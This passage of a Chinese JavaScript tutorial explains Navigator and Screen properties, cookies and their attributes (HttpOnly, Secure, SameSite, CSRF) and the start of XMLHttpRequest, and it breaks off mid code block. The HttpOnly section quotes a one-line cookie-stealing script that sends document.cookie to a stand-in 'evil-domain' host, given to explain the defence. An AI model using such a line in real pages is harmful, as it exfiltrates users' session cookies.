~~~~~~~~~~~~~~~~~~~~~~

    ``Navigator.geolocation`` 属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。

   Geolocation 对象提供下面三个方法。

   - Geolocation.getCurrentPosition()：得到用户的当前位置
   - Geolocation.watchPosition()：监听用户位置变化
   - Geolocation.clearWatch()：取消 ``watchPosition()`` 方法指定的监听函数

   注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。

Navigator.cookieEnabled
~~~~~~~~~~~~~~~~~~~~~~~~

    ``navigator.cookieEnabled`` 属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。

   .. code:: javascript

      navigator.cookieEnabled // true

   注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时 ``cookieEnabled`` 返回的还是 ``true`` 。

Navigator 对象的方法
------------------


Navigator.javaEnabled()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``navigator.javaEnabled()`` 方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。

   .. code:: javascript

      navigator.javaEnabled() // false

Navigator.sendBeacon()
~~~~~~~~~~~~~~~~~~~~~~~

    ``Navigator.sendBeacon()`` 方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。

Navigator 的实验性属性
--------------------

   Navigator 对象有一些实验性属性，在部分浏览器可用。

Navigator.deviceMemory
~~~~~~~~~~~~~~~~~~~~~~~

    ``navigator.deviceMemory`` 属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。

   它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回 ``8`` 。

   .. code:: javascript

      if (navigator.deviceMemory > 1) {
        await import('./costly-module.js');
      }

   上面示例中，只有当前内存大于 1GB，才加载大型的脚本。

Navigator.hardwareConcurrency
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``navigator.hardwareConcurrency`` 属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。

   现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。

   .. code:: javascript

      if (navigator.hardwareConcurrency > 4) {
        await import('./costly-module.js');
      }

   上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。

   该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。

   .. code:: javascript

      let workerList = [];
   
      for (let i = 0; i < window.navigator.hardwareConcurrency; i++) {
        let newWorker = {
          worker: new Worker('cpuworker.js'),
          inUse: false
        };
        workerList.push(newWorker);
      }

   上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。

Navigator.connection
~~~~~~~~~~~~~~~~~~~~~

    ``navigator.connection`` 属性返回一个对象，包含当前网络连接的相关信息。

   - downlink：有效带宽估计值（单位：兆比特/秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。
   - downlinkMax：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。
   - effectiveType：返回连接的等效类型，可能的值为 ``slow-2g`` 、 ``2g`` 、 ``3g`` 、 ``4g`` 。
   - rtt：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。
   - saveData：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回 ``true`` 或者 ``false`` 。
   - type：当前连接的介质类型，可能的值为 ``bluetooth`` 、 ``cellular`` 、 ``ethernet`` 、 ``none`` 、 ``wifi`` 、 ``wimax`` 、 ``other`` 、 ``unknown`` 。

   .. code:: javascript

      if (navigator.connection.effectiveType === '4g') {
        await import('./costly-module.js');
      }

   上面示例中，如果网络连接是 4G，则加载大型脚本。

Screen 对象
----------

   Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。 ``window.screen`` 属性指向这个对象。

   该对象有下面的属性。

   -  ``Screen.height`` ：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。
   -  ``Screen.width`` ：浏览器窗口所在的屏幕的宽度（单位像素）。
   -  ``Screen.availHeight`` ：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于 ``height`` 减去那些被系统组件的高度。
   -  ``Screen.availWidth`` ：浏览器窗口可用的屏幕宽度（单位像素）。
   -  ``Screen.pixelDepth`` ：整数，表示屏幕的色彩位数，比如 ``24`` 表示屏幕提供24位色彩。
   -  ``Screen.colorDepth`` ： ``Screen.pixelDepth`` 的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。
   -  ``Screen.orientation`` ：返回一个对象，表示屏幕的方向。该对象的 ``type`` 属性是一个字符串，表示屏幕的具体方向， ``landscape-primary`` 表示横放， ``landscape-secondary`` 表示颠倒的横放， ``portrait-primary`` 表示竖放， ``portrait-secondary`` 表示颠倒的竖放。

   下面是 ``Screen.orientation`` 的例子。

   .. code:: javascript

      window.screen.orientation
      // { angle: 0, type: "landscape-primary", onchange: null }

   下面的例子保证屏幕分辨率大于 1024 x 768。

   .. code:: javascript

      if (window.screen.width >= 1024 && window.screen.height >= 768) {
        // 分辨率不低于 1024x768
      }

   下面是根据屏幕的宽度，将用户导向不同网页的代码。

   .. code:: javascript

      if ((screen.width <= 800) && (screen.height <= 600)) {
        window.location.replace('small.html');
      } else {
        window.location.replace('wide.html');
      }

/🟠 Cookie
===========


概述
---

   Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。

   HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如 ``id=1234`` ），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。

   Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。

   - 对话（session）管理：保存登录状态、购物车等需要记录的信息。
   - 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
   - 追踪用户：记录和分析用户行为。

   Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。

   每个 Cookie 都有以下几方面的元数据。

   - Cookie 的名字
   - Cookie 的值（真正的数据写在这里面）
   - 到期时间（超过这个时间会失效）
   - 所属域名（默认为当前域名）
   - 生效的路径（默认为当前网址）

   举例来说，用户访问网址 ``www.example.com`` ，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为 ``www.example.com`` ，生效路径为根路径 ``/`` 。

   如果 Cookie 的生效路径设为 ``/forums`` ，那么这个 Cookie 只有在访问 ``www.example.com/forums`` 及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。

   用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。 ``window.navigator.cookieEnabled`` 属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。

   .. code:: javascript

      window.navigator.cookieEnabled // true

    ``document.cookie`` 属性返回当前网页的 Cookie。

   .. code:: javascript

      document.cookie // "id=foo;key=bar"

   不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。

   Cookie 是按照域名区分的， ``foo.com`` 只能读取自己放置的 Cookie，无法读取其他网站（比如 ``bar.com`` ）放置的 Cookie。一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如 ``mydomain.com`` 不能读取 ``subdomain.mydomain.com`` 设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将 ``domain`` 属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。

   .. code:: http

      Set-Cookie: name=value; domain=mydomain.com

   上面示例中，设置 Cookie 时， ``domain`` 属性设为 ``mydomain.com`` ，那么各级的子域名和一级域名都可以读取这个 Cookie。

   注意，区分 Cookie 时不考虑协议和端口。也就是说， ``http://example.com`` 设置的 Cookie，可以被 ``https://example.com`` 或 ``http://example.com:8080`` 读取。

Cookie 与 HTTP 协议
------------------

   Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。

HTTP 回应：Cookie 的生成
~~~~~~~~~~~~~~~~~~~~~~

   服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个 ``Set-Cookie`` 字段。

   .. code:: http

      Set-Cookie:foo=bar

   上面代码会在浏览器保存一个名为 ``foo`` 的 Cookie，它的值为 ``bar`` 。

   HTTP 回应可以包含多个 ``Set-Cookie`` 字段，即在浏览器生成多个 Cookie。下面是一个例子。

   .. code:: http

      HTTP/1.0 200 OK
      Content-type: text/html
      Set-Cookie: yummy_cookie=choco
      Set-Cookie: tasty_cookie=strawberry
   
      [page content]

   除了 Cookie 的值， ``Set-Cookie`` 字段还可以附加 Cookie 的属性。

   .. code:: http

      Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
      Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
      Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
      Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
      Set-Cookie: <cookie-name>=<cookie-value>; Secure
      Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly

   上面的几个属性的含义，将在后文解释。

   一个 ``Set-Cookie`` 字段里面，可以同时包括多个属性，没有次序的要求。

   .. code:: http

      Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly

   下面是一个例子。

   .. code:: http

      Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

   如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的 ``key`` 、 ``domain`` 、 ``path`` 和 ``secure`` 都匹配。举例来说，如果原始的 Cookie 是用如下的 ``Set-Cookie`` 设置的。

   .. code:: http

      Set-Cookie: key1=value1; domain=example.com; path=/blog

   改变上面这个 Cookie 的值，就必须使用同样的 ``Set-Cookie`` 。

   .. code:: http

      Set-Cookie: key1=value2; domain=example.com; path=/blog

   只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。

   .. code:: http

      Set-Cookie: key1=value2; domain=example.com; path=/

   上面的命令设置了一个全新的同名 Cookie，但是 ``path`` 属性不一样。下一次访问 ``example.com/blog`` 的时候，浏览器将向服务器发送两个同名的 Cookie。

   .. code:: http

      Cookie: key1=value1; key1=value2

   上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。

HTTP 请求：Cookie 的发送
~~~~~~~~~~~~~~~~~~~~~~

   浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的 ``Cookie`` 字段。

   .. code:: http

      Cookie: foo=bar

   上面代码会向服务器发送名为 ``foo`` 的 Cookie，值为 ``bar`` 。

    ``Cookie`` 字段可以包含多个 Cookie，使用分号（ ``;`` ）分隔。

   .. code:: http

      Cookie: name=value; name2=value2; name3=value3

   下面是一个例子。

   .. code:: http

      GET /sample_page.html HTTP/1.1
      Host: www.example.org
      Cookie: yummy_cookie=choco; tasty_cookie=strawberry

   服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。

   - Cookie 的各种属性，比如何时过期。
   - 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。

Cookie 的属性
------------


Expires，Max-Age
~~~~~~~~~~~~~~~~

    ``Expires`` 属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用 ``Date.prototype.toUTCString()`` 进行格式转换。

   .. code:: http

      Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

   如果不设置该属性，或者设为 ``null`` ，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。

    ``Max-Age`` 属性指定从现在开始 Cookie 存在的秒数，比如 ``60 * 60 * 24 * 365`` （即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。

   如果同时指定了 ``Expires`` 和 ``Max-Age`` ，那么 ``Max-Age`` 的值将优先生效。

   如果 ``Set-Cookie`` 字段没有指定 ``Expires`` 或 ``Max-Age`` 属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。

Domain，Path
~~~~~~~~~~~~

    ``Domain`` 属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。

   服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。

   如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。

   举例来说，当前域名为 ``x.y.z.com`` ，那么 Domain 属性可以设为 ``x.y.z.com`` ，或者 ``y.z.com`` ，或者 ``z.com`` ，但不能设为 ``foo.x.y.z.com`` ，或者 ``another.domain.com`` 。

   另一个例子是，当前域名为 ``wangdoc.github.io`` ，则 Domain 属性只能设为 ``wangdoc.github.io`` ，不能设为 ``github.io`` ，因为后者是一个公共域名。

   浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是 ``y.z.com`` ，那么适用于 ``y.z.com`` 、 ``x.y.z.com`` 、 ``foo.x.y.z.com`` 等域名。再比如，Domain 属性是公共域名 ``github.io`` ，那么只适用于 ``github.io`` 这个域名本身，不适用于它的子域名 ``wangdoc.github.io`` 。

    ``Path`` 属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现， ``Path`` 属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如， ``Path`` 属性是 ``/`` ，那么请求 ``/docs`` 路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。

Secure，HttpOnly
~~~~~~~~~~~~~~~~

    ``Secure`` 属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的 ``Secure`` 属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。

    ``HttpOnly`` 属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是 ``document.cookie`` 属性、 ``XMLHttpRequest`` 对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。

   .. code:: javascript

      (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

   上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的 ``HttpOnly`` 属性，上面代码就不会读到该 Cookie。

SameSite
~~~~~~~~~

   Chrome 51 开始，浏览器的 Cookie 新增加了一个 ``SameSite`` 属性，用来防止 CSRF 攻击和用户追踪。

   Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站 ``your-bank.com`` ，银行服务器发来了一个 Cookie。

   .. code:: http

      Set-Cookie:id=a3fWa;

   用户后来又访问了恶意网站 ``malicious.com`` ，上面有一个表单。

   .. code:: html

      <form action="your-bank.com/transfer" method="POST">
        ...
      </form>

   用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。

   .. code:: html

      <form action="your-bank.com/transfer" method="POST">
        <input type="hidden" name="token" value="dad3weg34">
        ...
      </form>

   这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。

   .. code:: html

      <img src="facebook.com" style="visibility:hidden;">

   浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。

   Cookie 的 ``SameSite`` 属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。

   > - Strict
   > - Lax
   > - None

   **（1）Strict**

    ``Strict`` 最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。

   .. code:: http

      Set-Cookie: CookieName=CookieValue; SameSite=Strict;

   这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。

   **（2）Lax**

    ``Lax`` 规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。

   .. code:: html

      Set-Cookie: CookieName=CookieValue; SameSite=Lax;

   导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。

   | 请求类型  |                 示例                 |    正常情况 | Lax         |
   |-----------|:------------------------------------:|------------:|-------------|
   | 链接      |  ``<a href="..."></a>``                  | 发送 Cookie | 发送 Cookie |
   | 预加载    |  ``<link rel="prerender" href="..."/>``  | 发送 Cookie | 发送 Cookie |
   | GET 表单  |  ``<form method="GET" action="...">``    | 发送 Cookie | 发送 Cookie |
   | POST 表单 |  ``<form method="POST" action="...">``   | 发送 Cookie | 不发送      |
   | iframe    |  ``<iframe src="..."></iframe>``         | 发送 Cookie | 不发送      |
   | AJAX      |  ``$.get("...")``                        | 发送 Cookie | 不发送      |
   | Image     |  ``<img src="...">``                     | 发送 Cookie | 不发送      |

   设置了 ``Strict`` 或 ``Lax`` 以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。

   **（3）None**

   Chrome 计划将 ``Lax`` 变为默认设置。这时，网站可以选择显式关闭 ``SameSite`` 属性，将其设为 ``None`` 。不过，前提是必须同时设置 ``Secure`` 属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

   下面的设置无效。

   .. code:: text

      Set-Cookie: widget_session=abc123; SameSite=None

   下面的设置有效。

   .. code:: text

      Set-Cookie: widget_session=abc123; SameSite=None; Secure

document.cookie
----------------

    ``document.cookie`` 属性用于读写当前网页的 Cookie。

   读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有 ``HTTPOnly`` 属性。

   .. code:: javascript

      document.cookie // "foo=bar;baz=bar"

   上面代码从 ``document.cookie`` 一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。

   .. code:: javascript

      var cookies = document.cookie.split(';');
   
      for (var i = 0; i < cookies.length; i++) {
        console.log(cookies[i]);
      }
      // foo=bar
      // baz=bar

    ``document.cookie`` 属性是可写的，可以通过它为当前网站添加 Cookie。

   .. code:: javascript

      document.cookie = 'fontSize=14';

   写入的时候，Cookie 的值必须写成 ``key=value`` 的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用 ``encodeURIComponent`` 方法达到。

   但是， ``document.cookie`` 一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。

   .. code:: javascript

      document.cookie = 'test1=hello';
      document.cookie = 'test2=world';
      document.cookie
      // test1=hello;test2=world

    ``document.cookie`` 读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候， ``Cookie`` 字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候， ``Set-Cookie`` 字段是一行设置一个 Cookie。

   写入 Cookie 的时候，可以一起写入 Cookie 的属性。

   .. code:: javascript

      document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";

   上面代码中，写入 Cookie 的时候，同时设置了 ``expires`` 属性。属性值的等号两边，也是不能有空格的。

   各个属性的写入注意点如下。

   -  ``path`` 属性必须为绝对路径，默认为当前路径。
   -  ``domain`` 属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是 ``example.com`` ，就不能将其设为 ``foo.com`` 。该属性默认为当前的一级域名（不含二级域名）。如果显式设置该属性，则该域名的任意子域名也可以读取 Cookie。
   -  ``max-age`` 属性的值为秒数。
   -  ``expires`` 属性的值为 UTC 格式，可以使用 ``Date.prototype.toUTCString()`` 进行日期格式转换。

    ``document.cookie`` 写入 Cookie 的例子如下。

   .. code:: javascript

      document.cookie = 'fontSize=14; '
        + 'expires=' + someDate.toGMTString() + '; '
        + 'path=/subdirectory; '
        + 'domain=example.com';

   注意，上面的 ``domain`` 属性，以前的写法是 ``.example.com`` ，表示子域名也可以读取该 Cookie，新的写法可以省略前面的点。

   Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。

   删除一个现存 Cookie 的唯一方法，是设置它的 ``expires`` 属性为一个过去的日期。

   .. code:: javascript

      document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';

   上面代码中，名为 ``fontSize`` 的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。

参考链接
-------

   - [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies), by MDN
   - [Using the Same-Site Cookie Attribute to Prevent CSRF Attacks](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
   - [SameSite cookies explained](https://web.dev/samesite-cookies-explained)
   - [Tough Cookies](https://scotthelme.co.uk/tough-cookies/), Scott Helme
   - [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/), Scott Helme

/🟠 XMLHttpRequest 对象
=======================


简介
---

   浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。

   1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。

   具体来说，AJAX 包括以下几个步骤。

   1. 创建 XMLHttpRequest 实例
   1. 发出 HTTP 请求
   1. 接收服务器传回的数据
   1. 更新网页数据

   概括起来，就是一句话，AJAX 通过原生的 ``XMLHttpRequest`` 对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。

    ``XMLHttpRequest`` 对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有 ``XML`` 和 ``Http`` ，它实际上可以使用多种协议（比如 ``file`` 或 ``ftp`` ），发送任何格式的数据（包括字符串和二进制）。

    ``XMLHttpRequest`` 本身是一个构造函数，可以使用 ``new`` 命令生成实例。它没有任何参数。

   .. code:: javascript

      var xhr = new XMLHttpRequest();

   一旦新建实例，就可以使用 ``open()`` 方法指定建立 HTTP 连接的一些细节。

   .. code:: javascript

      xhr.open('GET', 'http://www.example.com/page.php', true);

   上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数 ``true`` ，表示请求是异步的。

   然后，指定回调函数，监听通信状态（ ``readyState`` 属性）的变化。

   .. code:: javascript

      xhr.onreadystatechange = handleStateChange;
   
      function handleStateChange() {
        // ...
      }

   上面代码中，一旦 ``XMLHttpRequest`` 实例的状态发生变化，就会调用监听函数 ``handleStateChange`` 

   最后使用 ``send()`` 方法，实际发出请求。

   .. code:: javascript

      xhr.send(null);

   上面代码中， ``send()`` 的参数为 ``null`` ，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。

   一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。

   注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。

   下面是 ``XMLHttpRequest`` 对象简单用法的完整例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      xhr.onreadystatechange = function(){
        // 通信成功时，状态值为4
        if (xhr.readyState === 4){
          if (xhr.status === 200){
            console.log(xhr.responseText);
          } else {
            console.error(xhr.statusText);
          }
        }
      };
   
      xhr.onerror = function (e) {
        console.error(xhr.statusText);
      };
   
      xhr.open('GET', '/endpoint', true);
      xhr.send(null);

XMLHttpRequest 的实例属性
-----------------------


XMLHttpRequest.readyState
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.readyState`` 返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。

   - 0，表示 XMLHttpRequest 实例已经生成，但是实例的 ``open()`` 方法还没有被调用。
   - 1，表示 ``open()`` 方法已经调用，但是实例的 ``send()`` 方法还没有调用，仍然可以使用实例的 ``setRequestHeader()`` 方法，设定 HTTP 请求的头信息。
   - 2，表示实例的 ``send()`` 方法已经调用，并且服务器返回的头信息和状态码已经收到。
   - 3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的 ``responseType`` 属性等于 ``text`` 或者空字符串， ``responseText`` 属性就会包含已经收到的部分信息。
   - 4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。

   通信过程中，每当实例对象发生状态变化，它的 ``readyState`` 属性的值就会改变。这个值每一次变化，都会触发 ``readyStateChange`` 事件。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      if (xhr.readyState === 4) {
        // 请求结束，处理服务器返回的数据
      } else {
        // 显示提示“加载中……”
      }

   上面代码中， ``xhr.readyState`` 等于 ``4`` 时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。

XMLHttpRequest.onreadystatechange
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.onreadystatechange`` 属性指向一个监听函数。 ``readystatechange`` 事件发生时（实例的 ``readyState`` 属性变化），就会执行这个属性。

   另外，如果使用实例的 ``abort()`` 方法，终止 XMLHttpRequest 请求，也会造成 ``readyState`` 属性变化，导致调用 ``XMLHttpRequest.onreadystatechange`` 属性。

   下面是一个例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open( 'GET', 'http://example.com' , true );
      xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4 || xhr.status !== 200) {
          return;
        }
        console.log(xhr.responseText);
      };
      xhr.send();

XMLHttpRequest.response
~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.response`` 属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由 ``XMLHttpRequest.responseType`` 属性决定。该属性只读。

   如果本次请求没有成功或者数据不完整，该属性等于 ``null`` 。但是，如果 ``responseType`` 属性等于 ``text`` 或空字符串，在请求没有结束之前（ ``readyState`` 等于3的阶段）， ``response`` 属性包含服务器已经返回的部分数据。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          handler(xhr.response);
        }
      }

XMLHttpRequest.responseType
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``XMLHttpRequest.responseType`` 属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用 ``open()`` 方法之后、调用 ``send()`` 方法之前，设置这个属性的值，告诉浏览器如何解读返回的数据。如果 ``responseType`` 设为空字符串，就等同于默认值 ``text`` 。

    ``XMLHttpRequest.responseType`` 属性可以等于以下值。

   - ""（空字符串）：等同于 ``text`` ，表示服务器返回文本数据。
   - "arraybuffer"：ArrayBuffer 对象，表示服务器返回二进制数组。
   - "blob"：Blob 对象，表示服务器返回二进制对象。
   - "document"：Document 对象，表示服务器返回一个文档对象。
   - "json"：JSON 对象。
   - "text"：字符串。

   上面几种类型之中， ``text`` 类型适合大多数情况，而且直接处理文本也比较方便。 ``document`` 类型适合返回 HTML / XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。 ``blob`` 类型适合读取二进制数据，比如图片文件。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/path/to/image.png', true);
      xhr.responseType = 'blob';
   
      xhr.onload = function(e) {
        if (this.status === 200) {
          var blob = new Blob([xhr.response], {type: 'image/png'});
          // 或者
          var blob = xhr.response;
        }
      };
   
      xhr.send();

   如果将这个属性设为 ``ArrayBuffer`` ，就可以按照数组的方式处理二进制数据。

   .. code:: javascript

